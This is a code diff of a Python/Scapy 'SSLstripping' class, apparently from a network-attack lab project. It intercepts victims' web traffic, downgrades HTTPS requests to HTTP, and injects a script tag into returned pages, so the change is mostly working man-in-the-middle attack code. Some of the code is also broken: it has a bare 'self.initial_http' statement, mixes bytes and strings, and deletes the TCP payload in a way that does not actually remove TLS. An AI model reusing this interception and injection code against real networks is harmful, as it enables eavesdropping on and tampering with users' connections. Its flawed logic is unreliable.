@@ -732,6 +732,7 @@ class SSLstripping(object):
     """
     def __init__(self, selected_interface):
         self.SELECTED_INTERFACE = selected_interface
+        self.initial_http
     
     # def modify_request(self, packet):
     #     # Retrieve the HTTP request layer
@@ -750,37 +751,69 @@ class SSLstripping(object):
         
     #     return packet
     
-    def modify_response_to_http(response):
-        if response[TCP].dport == 80: 
-            # if the response is already http we don't need to do anything
-            pass
-        elif response[TCP].dport==443:
-            # if the response if https
-            del response[TCP].dport
-            response[TCP].dport = 80
-            response[Raw].load = response[Raw].load.replace("https", "http")
-            response[Raw].load = response[Raw].load.replace("HTTPS", "HTTP")
-        
-            # Delete checksum and length fields, will be recalculated by Scapy
-            del response.chksum
-            del response[IP].len
-            del response[TCP].chksum
-            
-        return response
+    def sslstrip_packet(self, packet):
+        if TCP in packet and Raw in packet:
+            raw_payload = packet[Raw].load
 
-    def modify_content(self, response):
-        if Raw in response:
+            # Check if it's an HTTPS request
+            if b"CONNECT" in raw_payload:
+                # Modify the request to target the destination HTTP server
+                modified_payload = raw_payload.replace(b"CONNECT", b"GET")
+                packet[Raw].load = modified_payload
+
+                # Remove the TLS layer from the packet
+                del packet[TCP].payload
+
+                # Recalculate IP and TCP checksums
+                del packet[IP].len
+                del packet[IP].chksum
+                del packet[TCP].chksum
+
+        return packet
+        # if response[TCP].dport == 80: 
+        #     # if the response is already http we don't need to do anything
+        #     pass
+        # elif response[TCP].dport==443:
+        #     # if the response if https
+        #     del response[TCP].dport
+        #     response[TCP].dport = 80
+        #     response[Raw].load = response[Raw].load.replace("https", "http")
+        #     response[Raw].load = response[Raw].load.replace("HTTPS", "HTTP")
+        
+        #     # Delete checksum and length fields, will be recalculated by Scapy
+        #     del response.chksum
+        #     del response[IP].len
+        #     del response[TCP].chksum
+            
+        # return response
+
+    def modify_content(self, packet):
+        if Raw in packet:
             # Retrieve the raw payload of the packet
-            raw = response[Raw]
-            
+            raw_payload = packet[Raw].load
+
             # Modify the content of the web page (e.g., injecting scripts)
-            raw.load = raw.load.replace("</body>", "<script>alert('XSS')</script></body>")
+            modified_payload = raw_payload.replace("</body>", "<script> alert('XSS')</script></body>")
+            packet[Raw].load = modified_payload
+
+            # Recalculate TCP checksum
+            del packet[TCP].chksum
+
+        return packet
+    
+    
+        # if Raw in response:
+        #     # Retrieve the raw payload of the packet
+        #     raw = response[Raw]
             
-            # Recalculate checksums and lengths
-            del response[IP].len
-            del response[TCP].chksum
+        #     # Modify the content of the web page (e.g., injecting scripts)
+        #     raw.load = raw.load.replace("</body>", "<script>alert('XSS')</script></body>")
             
-        return response
+        #     # Recalculate checksums and lengths
+        #     del response[IP].len
+        #     del response[TCP].chksum
+            
+        # return response
 
     def forward_packet(self, packet):
         """Forwarding of arbitrary packets
@@ -790,27 +823,57 @@ class SSLstripping(object):
         """
         sendp(packet, iface=self.SELECTED_INTERFACE, verbose=0)
 
+
     def handle_packet(self, packet):
-        # server -> me : sport = http(s)
-        # me -> server : dport = http(s)
+        # global initial_http
+        # global sslstrip
+
+        if packet.haslayer(TCP) and packet.haslayer(Raw):
+            raw_payload = packet.getlayer(Raw).load
+
+            if b"GET" in raw_payload:
+                # Step 2: Initial HTTP Connection
+                if self.initial_http:
+                    packet = self.modify_content(packet)
+                    send(packet, iface=self.SELECTED_INTERFACE)
+                    self.initial_http = False
+                else:
+                    # Subsequent HTTP requests
+                    response = sr1(packet)
+
+                    if response and TCP in response:
+                        # Step 4: SSL Stripping
+                        response = self.sslstrip_packet(response)
+
+                        # Step 5: Content Modification
+                        response = self.modify_content(response)
+
+                        # Send the modified response to the user's browser
+                        send(response, iface=self.SELECTED_INTERFACE)
+        else:
+            pass
+    
+    # def handle_packet(self, packet):
+    #     # server -> me : sport = http(s)
+    #     # me -> server : dport = http(s)
         
-        if TCP in packet:
-            if packet[TCP].dport in [80,443]:    # if we have an HTTP(S) request
-                # send packet and get response
-                response = sr1(packet, iface=self.SELECTED_INTERFACE)
+    #     if TCP in packet:
+    #         if packet[TCP].dport in [80,443]:    # if we have an HTTP(S) request
+    #             # send packet and get response
+    #             response = sr1(packet, iface=self.SELECTED_INTERFACE)
                 
-                # if the response is https then we turn it into http
-                if response and response[TCP].sport==443:
-                    # Step 4: HTTPS to HTTP Conversion
-                    response = self.modify_response_to_http(response)
+    #             # if the response is https then we turn it into http
+    #             if response and response[TCP].sport==443:
+    #                 # Step 4: HTTPS to HTTP Conversion
+    #                 response = self.modify_response_to_http(response)
                     
-                    # Step 5: Content Modification
-                    response = self.modify_content(response)
+    #                 # Step 5: Content Modification
+    #                 response = self.modify_content(response)
                     
-                    # Send the modified response to the user's browser
-                    sendp(response, iface=self.SELECTED_INTERFACE)
-            else:
-                self.forward_packet(packet)
+    #                 # Send the modified response to the user's browser
+    #                 sendp(response, iface=self.SELECTED_INTERFACE)
+    #         else:
+    #             self.forward_packet(packet)
     
 
 def main():
